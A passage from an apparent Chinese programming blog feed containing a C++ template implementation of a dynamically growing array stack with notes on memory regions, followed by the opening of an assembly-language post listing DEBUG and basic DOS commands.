&#x7C7B;&#x6A21;&#x677F;&#x7684;&#x58F0;&#x660E;(line 3)&#xFF0C;&#x7C7B;&#x6A21;&#x677F;&#x5B9E;&#x4F8B;&#x5316;&#x540E;&#x5C31;&#x662F;&#x6A21;&#x677F;&#x7C7B;</span></span><br><span class="line"><span class="comment">// &#x7C7B;&#x6A21;&#x677F;&#x58F0;&#x660E;&#x7684;&#x5199;&#x6CD5;   template &lt;class T&gt; class &#x7C7B;&#x540D;{}</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">class</span> <span class="title">ArrayStack</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ArrayStack();</span><br><span class="line">    ArrayStack(<span class="keyword">int</span> count);</span><br><span class="line">    ~ArrayStack();</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(T data)</span></span>;     <span class="comment">//&#x5165;&#x6808;</span></span><br><span class="line">    <span class="function">T <span class="title">pop</span><span class="params">()</span></span>;      <span class="comment">//&#x51FA;&#x6808;&#xFF0C;&#x5E76;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20;</span></span><br><span class="line">    <span class="function">T <span class="title">peek</span><span class="params">()</span></span>;     <span class="comment">//&#x8FD4;&#x56DE;&#x6808;&#x9876;&#x5143;&#x7D20;&#xFF0C;&#x4E0D;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20;&#xFF0C;&#x6808;&#x9876;&#x6307;&#x9488;&#x4E0D;&#x53D8;</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">stackSize</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">stackMaxSize</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> flag;       <span class="comment">//&#x6808;&#x9876;&#x6807;&#x7B7E;&#xFF0C;&#x6307;&#x5411;&#x6808;&#x9876;</span></span><br><span class="line">    <span class="keyword">int</span> count ;     <span class="comment">//&#x6808;&#x7684;&#x5BB9;&#x91CF;</span></span><br><span class="line">    T *<span class="built_in">array</span>;       <span class="comment">//&#x6307;&#x9488;</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>StackBasedOnArray.cpp<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1&#xFF09;&#x987A;&#x5E8F;&#x6808;&#x7684;&#x64CD;&#x4F5C;&#xFF1A;&#x5165;&#x6808;&#x548C;&#x51FA;&#x6808;&#xFF1B;</span></span><br><span class="line"><span class="comment"> * 2&#xFF09;&#x91C7;&#x7528;&#x6A21;&#x677F;&#x7684;&#x65B9;&#x6CD5;&#x5B9E;&#x73B0;&#x5B58;&#x50A8;&#x4EFB;&#x610F;&#x7C7B;&#x578B;&#x7684;&#x6570;&#x636E;</span></span><br><span class="line"><span class="comment"> * 3&#xFF09;&#x91C7;&#x7528;&#x6570;&#x7EC4;&#x7684;&#x6808;&#xFF0C;&#x652F;&#x6301;&#x52A8;&#x6001;&#x6269;&#x5BB9;&#xFF0C;&#x6BCF;&#x6B21;&#x6269;&#x5BB9;1.5 &#x500D;&#xFF0C;&#x521D;&#x59CB;&#x6808;&#x7684;&#x5927;&#x5C0F;&#x662F; 10 &#x3002;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Author&#xFF1A;caozx</span></span><br><span class="line"><span class="comment"> * time &#xFF1B;2018&#x5E74;10&#x6708;11&#x65E5;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;StackBasedOnArray.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x521B;&#x5EFA;&#x6808;</span></span><br><span class="line"><span class="comment">//&#x7C7B;&#x6A21;&#x677F;&#x6210;&#x5458;&#x51FD;&#x6570;&#x7684;&#x5199;&#x6CD5;  template&lt;class T&gt; &#x8FD4;&#x56DE;&#x503C;&#x7C7B;&#x578B; &#x7C7B;&#x540D;&lt;T&gt;::&#x6210;&#x5458;&#x51FD;&#x6570;&#x540D;(&#x53C2;&#x6570;&#x5217;&#x8868;){}</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">ArrayStack</span>&lt;T&gt;:</span>:ArrayStack()   </span><br><span class="line">{   </span><br><span class="line">    <span class="keyword">this</span> -&gt; count = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">this</span> -&gt; flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span> -&gt; <span class="built_in">array</span> = <span class="keyword">new</span> T[<span class="keyword">this</span> -&gt; count];</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">this</span> -&gt; <span class="built_in">array</span>){</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;array malloc memory failure&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x6709;&#x53C2;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x521B;&#x5EFA;&#x6808;</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">ArrayStack</span>&lt;T&gt;:</span>:ArrayStack(<span class="keyword">int</span> count)   </span><br><span class="line">{   </span><br><span class="line">    <span class="keyword">this</span> -&gt; count = count;</span><br><span class="line">    <span class="keyword">this</span> -&gt; flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span> -&gt; <span class="built_in">array</span> = <span class="keyword">new</span> T[<span class="keyword">this</span> -&gt; count];</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">this</span> -&gt; <span class="built_in">array</span>){</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;array malloc memory failure&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x6790;&#x6784;&#x51FD;&#x6570;&#xFF0C;&#x9500;&#x6BC1;&#x6808;</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">ArrayStack</span>&lt;T&gt;:</span>:~ArrayStack(){</span><br><span class="line">    <span class="keyword">this</span> -&gt; count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span> -&gt; flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span> -&gt; <span class="built_in">array</span>){</span><br><span class="line">        <span class="keyword">delete</span> [] <span class="keyword">this</span> -&gt; <span class="built_in">array</span>;</span><br><span class="line">        <span class="keyword">this</span> -&gt; <span class="built_in">array</span> = <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">} </span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x5165;&#x6808;</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">void</span> <span class="title">ArrayStack</span>&lt;T&gt;:</span>:push(T data){</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span> -&gt; flag == <span class="keyword">this</span> -&gt; count){</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The stack is full , so need to enlarge 1.5x! &quot;</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">this</span> -&gt; count = <span class="keyword">int</span> (<span class="number">1.5</span> * <span class="keyword">this</span> -&gt; count);</span><br><span class="line">        T * temp = <span class="keyword">new</span> T [<span class="keyword">this</span> -&gt; count];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span> -&gt; flag ; i++){</span><br><span class="line">            temp[i] = <span class="keyword">this</span> -&gt; <span class="built_in">array</span>[i];</span><br><span class="line">            <span class="comment">//cout &lt;&lt; temp[i] &lt;&lt;endl;</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">delete</span> [] <span class="keyword">this</span> -&gt; <span class="built_in">array</span>;       <span class="comment">//&#x91CA;&#x653E;&#x539F;&#x6765;&#x7684;&#x7A7A;&#x95F4;</span></span><br><span class="line">        temp[<span class="keyword">this</span> -&gt; flag] = data;</span><br><span class="line">        <span class="keyword">this</span> -&gt; flag ++;</span><br><span class="line">        <span class="keyword">this</span> -&gt; <span class="built_in">array</span> = temp;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">this</span> -&gt; <span class="built_in">array</span> [<span class="keyword">this</span> -&gt; flag] = data;</span><br><span class="line">        <span class="keyword">this</span> -&gt; flag ++ ;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x51FA;&#x6808;&#xFF0C;&#x5E76;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20;</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">T</span> <span class="title">ArrayStack</span>&lt;T&gt;:</span>:pop(){</span><br><span class="line">    <span class="keyword">this</span> -&gt; flag --;</span><br><span class="line">    T temp = <span class="keyword">this</span> -&gt; <span class="built_in">array</span>[<span class="keyword">this</span> -&gt; flag];</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x51FA;&#x6808;&#xFF0C;&#x4E0D;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20;</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">T</span> <span class="title">ArrayStack</span>&lt;T&gt;:</span>:peek(){</span><br><span class="line">    T temp = <span class="keyword">this</span> -&gt; <span class="built_in">array</span>[<span class="keyword">this</span> -&gt; flag - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">int</span> <span class="title">ArrayStack</span>&lt;T&gt;:</span>:stackSize(){</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span> -&gt; flag;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">int</span> <span class="title">ArrayStack</span>&lt;T&gt;:</span>:stackMaxSize(){</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span> -&gt; count;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; === test begin ===&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ArrayStack &lt;<span class="keyword">int</span>&gt; arrstack(<span class="number">12</span>);</span><br><span class="line">    arrstack.push(<span class="number">10</span>);</span><br><span class="line">    arrstack.push(<span class="number">20</span>);</span><br><span class="line">    arrstack.push(<span class="number">30</span>);</span><br><span class="line">    arrstack.push(<span class="number">40</span>);</span><br><span class="line">    arrstack.push(<span class="number">50</span>);</span><br><span class="line">    arrstack.push(<span class="number">60</span>);</span><br><span class="line">    arrstack.push(<span class="number">70</span>);</span><br><span class="line">    arrstack.push(<span class="number">80</span>);</span><br><span class="line">    arrstack.push(<span class="number">90</span>);</span><br><span class="line">    arrstack.push(<span class="number">100</span>);</span><br><span class="line">    arrstack.push(<span class="number">110</span>);</span><br><span class="line">    arrstack.push(<span class="number">120</span>);</span><br><span class="line">    arrstack.push(<span class="number">130</span>);</span><br><span class="line">    arrstack.push(<span class="number">140</span>);</span><br><span class="line">    arrstack.push(<span class="number">150</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;peek , not delete &quot;</span> &lt;&lt; arrstack.peek() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pop , delete &quot;</span> &lt;&lt; arrstack.pop()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    arrstack.push(<span class="number">210</span>);</span><br><span class="line">    arrstack.push(<span class="number">220</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;peek , not delete &quot;</span> &lt;&lt; arrstack.peek() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pop , delete &quot;</span> &lt;&lt; arrstack.pop()&lt;&lt;<span class="built_in">endl</span>;    </span><br><span class="line">   </span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x601D;&#x8003;</strong></p><ol><li><p>&#x51FD;&#x6570;&#x4E2D;&#x5B58;&#x5728;&#x7684;&#x5D4C;&#x5957;&#xFF0C;&#x4F7F;&#x7528;&#x6808;&#x6765;&#x5B58;&#x50A8;&#x4E34;&#x65F6;&#x53D8;&#x91CF;&#xFF0C;&#x80FD;&#x591F;&#x6EE1;&#x8DB3;&#x91CC;&#x5C42;&#x51FD;&#x6570;&#x8BA1;&#x7B97;&#x7684;&#x7ED3;&#x679C;&#x8FD4;&#x56DE;&#x7ED9;&#x5916;&#x5C42;&#x51FD;&#x6570;&#xFF08;&#x9010;&#x7EA7;&#x5411;&#x5916;&#xFF09;&#x7684;&#x9700;&#x6C42;&#x3002;</p></li><li><p>&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x5806;&#x6808;&#x548C;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x5806;&#x6808;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x6982;&#x5FF5;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x5806;&#x6808;&#x662F;&#x771F;&#x5B9E;&#x5B58;&#x5728;&#x7684;&#x7269;&#x7406;&#x533A;&#xFF0C;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x4E2D;&#x7684;&#x5806;&#x6808;&#x662F;&#x62BD;&#x8C61;&#x7684;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x7ED3;&#x6784;&#x3002;<br>&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x5728;&#x903B;&#x8F91;&#x4E0A;&#x5206;&#x4E3A;&#x4E09;&#x90E8;&#x5206;&#xFF1A;&#x4EE3;&#x7801;&#x533A;&#x3001;&#x9759;&#x6001;&#x6570;&#x636E;&#x533A;&#x548C;&#x52A8;&#x6001;&#x6570;&#x636E;&#x533A;&#xFF0C;&#x52A8;&#x6001;&#x6570;&#x636E;&#x533A;&#x53C8;&#x5206;&#x4E3A;&#x6808;&#x533A;&#x548C;&#x5806;&#x533A;&#x3002;<br>&#x4EE3;&#x7801;&#x533A;&#xFF1A;&#x5B58;&#x50A8;&#x65B9;&#x6CD5;&#x4F53;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#x3002;&#x9AD8;&#x7EA7;&#x8C03;&#x5EA6;&#xFF08;&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#xFF09;&#x3001;&#x4E2D;&#x7EA7;&#x8C03;&#x5EA6;&#xFF08;&#x5185;&#x5B58;&#x8C03;&#x5EA6;&#xFF09;&#x3001;&#x4F4E;&#x7EA7;&#x8C03;&#x5EA6;&#xFF08;&#x8FDB;&#x7A0B;&#x8C03;&#x5EA6;&#xFF09;&#x63A7;&#x5236;&#x4EE3;&#x7801;&#x533A;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x7684;&#x5207;&#x6362;&#x3002;<br>&#x9759;&#x6001;&#x6570;&#x636E;&#x533A;&#xFF1A;&#x5B58;&#x50A8;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x3001;&#x9759;&#x6001;&#x53D8;&#x91CF;&#x3001;&#x5E38;&#x91CF;&#xFF0C;&#x5E38;&#x91CF;&#x5305;&#x62EC;final&#x4FEE;&#x9970;&#x7684;&#x5E38;&#x91CF;&#x548C;String&#x5E38;&#x91CF;&#x3002;&#x7CFB;&#x7EDF;&#x81EA;&#x52A8;&#x5206;&#x914D;&#x548C;&#x56DE;&#x6536;&#x3002;<br>&#x6808;&#x533A;&#xFF1A;&#x5B58;&#x50A8;&#x8FD0;&#x884C;&#x65B9;&#x6CD5;&#x7684;&#x5F62;&#x53C2;&#x3001;&#x5C40;&#x90E8;&#x53D8;&#x91CF;&#x3001;&#x8FD4;&#x56DE;&#x503C;&#x3002;&#x7531;&#x7CFB;&#x7EDF;&#x81EA;&#x52A8;&#x5206;&#x914D;&#x548C;&#x56DE;&#x6536;&#x3002;<br>&#x5806;&#x533A;&#xFF1A;new&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x7684;&#x5F15;&#x7528;&#x6216;&#x5730;&#x5740;&#x5B58;&#x50A8;&#x5728;&#x6808;&#x533A;&#xFF0C;&#x6307;&#x5411;&#x8BE5;&#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x5728;&#x5806;&#x533A;&#x4E2D;&#x7684;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x3002;</p></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Assembly language</title>
      <link href="/2018/10/24/Assembly-language/"/>
      <url>/2018/10/24/Assembly-language/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_huibian.jpeg" alt=""></p><a id="more"></a><h1 id="&#x4E00;-DOS&#x53CA;DEBUG&#x4ECB;&#x7ECD;&#xFF1A;"><a href="#&#x4E00;-DOS&#x53CA;DEBUG&#x4ECB;&#x7ECD;&#xFF1A;" class="headerlink" title="&#x4E00; DOS&#x53CA;DEBUG&#x4ECB;&#x7ECD;&#xFF1A;"></a>&#x4E00; DOS&#x53CA;DEBUG&#x4ECB;&#x7ECD;&#xFF1A;</h1><h2 id="DEBUG&#x7684;&#x4E3B;&#x8981;&#x547D;&#x4EE4;"><a href="#DEBUG&#x7684;&#x4E3B;&#x8981;&#x547D;&#x4EE4;" class="headerlink" title="DEBUG&#x7684;&#x4E3B;&#x8981;&#x547D;&#x4EE4;"></a>DEBUG&#x7684;&#x4E3B;&#x8981;&#x547D;&#x4EE4;</h2><h3 id="DEBUG&#x547D;&#x4EE4;&#x6709;20&#x591A;&#x4E2A;&#xFF0C;&#x6211;&#x4EEC;&#x4E3B;&#x8981;&#x5B66;&#x4E60;&#x6700;&#x5E38;&#x7528;&#x7684;&#x547D;&#x4EE4;&#x3002;"><a href="#DEBUG&#x547D;&#x4EE4;&#x6709;20&#x591A;&#x4E2A;&#xFF0C;&#x6211;&#x4EEC;&#x4E3B;&#x8981;&#x5B66;&#x4E60;&#x6700;&#x5E38;&#x7528;&#x7684;&#x547D;&#x4EE4;&#x3002;" class="headerlink" title="DEBUG&#x547D;&#x4EE4;&#x6709;20&#x591A;&#x4E2A;&#xFF0C;&#x6211;&#x4EEC;&#x4E3B;&#x8981;&#x5B66;&#x4E60;&#x6700;&#x5E38;&#x7528;&#x7684;&#x547D;&#x4EE4;&#x3002;"></a>DEBUG&#x547D;&#x4EE4;&#x6709;20&#x591A;&#x4E2A;&#xFF0C;&#x6211;&#x4EEC;&#x4E3B;&#x8981;&#x5B66;&#x4E60;&#x6700;&#x5E38;&#x7528;&#x7684;&#x547D;&#x4EE4;&#x3002;</h3><p>R &#x2014;&#x2014;&#x67E5;&#x770B;&#x548C;&#x4FEE;&#x6539;&#x5BC4;&#x5B58;&#x5668;<br>D &#x2014;&#x2014;&#x67E5;&#x770B;&#x5185;&#x5B58;&#x5355;&#x5143;<br>E &#x2014;&#x2014;&#x4FEE;&#x6539;&#x5185;&#x5B58;&#x5355;&#x5143;<br>U &#x2014;&#x2014;&#x53CD;&#x6C47;&#x7F16;&#xFF0C;&#x5C06;&#x673A;&#x5668;&#x6307;&#x4EE4;&#x53D8;&#x4E3A;&#x6C47;&#x7F16;&#x6307;&#x4EE4;<br>T /P&#x2014;&#x2014;&#x5355;&#x6B65;&#x6267;&#x884C;<br>G &#x2014;&#x2014;&#x8FDE;&#x7EED;&#x6267;&#x884C;&#x7A0B;&#x5E8F;<br>A &#x2014;&#x2014;&#x8F93;&#x5165;&#x6C47;&#x7F16;&#x6307;&#x4EE4;<br>Q &#x2014;&#x2014;&#x9000;&#x51FA;</p><h2 id="&#x672C;&#x4E66;&#x7528;&#x5230;&#x7684;&#x7B80;&#x5355;&#x7684;DOS&#x547D;&#x4EE4;&#xFF1A;"><a href="#&#x672C;&#x4E66;&#x7528;&#x5230;&#x7684;&#x7B80;&#x5355;&#x7684;DOS&#x547D;&#x4EE4;&#xFF1A;" class="headerlink" title="&#x672C;&#x4E66;&#x7528;&#x5230;&#x7684;&#x7B80;&#x5355;&#x7684;DOS&#x547D;&#x4EE4;&#xFF1A;"></a>&#x672C;&#x4E66;&#x7528;&#x5230;&#x7684;&#x7B80;&#x5355;&#x7684;DOS&#x547D;&#x4EE4;&#xFF1A;</h2><p>cd\ &#x2014;&#x2014;&#x9996;&#x5148;&#x8981;&#x7528;cd\ &#x9000;&#x56DE;&#x5230;&#x6839;&#x76EE;&#x5F55;C&gt;&#x4E0B;<br>dir &#x2014;&#x2014;&#x663E;&#x793A;&#x6587;&#x4EF6;&#x5217;&#x8868;<br>md hb &#x2014;&#x2014;&#x5EFA;&#x7ACB;hb&#x5B50;&#x76EE;&#x5F55;<br>cd hb &#x2014;&#x2014;&#x8FDB;&#x5165;hb&#x5B50;&#x76EE;&#x5F55;<br>copy d:\dos\masm.exe c:\hb &#x2014;&#x2014;&#x5C06;D&#x76D8;dos&#x76EE;&#x5F55;&#x4E0B;&#x7684;masm.exe&#x62F7;&#x8D1D;&#x5230;C&#x76D8;hb&#x76EE;&#x5F55;&#x4E0B;<br>copy d:\dos\link.exe c:\hb &#x2014;&#x2014;&#x5C06;D&#x76D8;dos&#x76EE;&#x5F55;&#x4E0B;&#x7684;link.exe&#x62F7;&#x8D1D;&#x5230;C&#x76D8;hb&#x76EE;&#x5F55;&#x4E0B;<br>cd .. &#x2014;&#x2014;&#x9000;&#x56DE;&#x5230;&#x4E0A;&#x4E00;&#x7EA7;&#x76EE;&#x5F55;<br>del \hb\masm.exe &#x2014;&#x2014;&#x5220;&#x9664;hb&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x67D0;&#x6587;&#x4EF6;<br>rd hb &#x2014;&#x2014;&#x5220;&#x9664;hb&#x5B50;&#x76EE;&#x5F55;&#xFF08;&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x5FC5;&#x987B;&#x5148;&#x5220;&#x9664;&#xFF09;<br>e&#xFF1A;&#x2014;&#x2014;&#x8FDB;&#x5165;e&#x76D8;<br>cls &#x2014;&#x2014;&#x6E05;&#x5C4F;<br>type&#x2014;&#x2014;&#x663E;&#x793A;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF08;&#x5982;type c:\hb\abc.asm&#xFF09;</p><h2 id="&#x6570;&#x7684;&#x8865;&#x7801;&#x8868;&#x793A;"><a href="#&#x6570;&#x7684;&#x8865;&#x7801;&#x8868;&#x793A;" class="headerlink" title="&#x6570;&#x7684;&#x8865;&#x7801;&#x8868;&#x793A;:"></a>&#x6570;&#x7684;&#x8865;&#x7801;&#x8868;&#x793A;:</h2><p>&#x5728;&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#xFF0C;&#x5BF9;&#x5E26;&#x7B26;&#x53F7;&#x6570;&#x53EF;&#x7528;&#x771F;&#x503C;&#x548C;&#x673A;&#x5668;&#x6570;&#x4E24;&#x4E2A;&#x6982;&#x5FF5;&#x8868;&#x793A;&#x3002;&#x771F;&#x503C;&#xFF0C;&#x5C31;&#x662F;&#x5E26;&#x6709;&#x201C;+&#x201D;&#x3001;&#x201C;-&#x201D;&#x53F7;&#x7684;&#x5B9E;&#x9645;&#x6570;&#x503C;&#xFF1B;&#x6240;&#x8C13;&#x673A;&#x5668;&#x6570;&#xFF0C;&#x5219;&#x662F;&#x628A;&#x201C;+&#x201D;&#x3001;&#x201C;-&#x201D;&#x7B26;&#x53F7;&#x6570;&#x503C;&#x5316;&#xFF08;0&#x3001;1&#xFF09;&#x540E;&#x6240;&#x5F97;&#x5230;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#x5B9E;&#x9645;&#x80FD;&#x8868;&#x793A;&#x7684;&#x6570;&#x3002;<br>&#x673A;&#x5668;&#x6570;&#x6709;&#x4E09;&#x79CD;&#x7801;&#x8868;&#x793A;&#xFF0C;&#x5206;&#x522B;&#x662F;&#x539F;&#x7801;&#x3001;&#x53CD;&#x7801;&#x548C;&#x8865;&#x7801;&#x3002;&#x6C47;&#x7F16;&#x8BED;&#x8A00;&#x4E2D;&#xFF0C;&#x6570;&#x90FD;&#x662F;&#x4EE5;&#x8865;&#x7801;&#x7684;&#x5F62;&#x5F0F;&#x8868;&#x793A;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x5FC5;&#x987B;&#x638C;&#x63E1;&#x6570;&#x7684;&#x8865;&#x7801;&#x8868;&#x793A;&#x548C;&#x8865;&#x7801;&#x7684;&#x8FD0;&#x7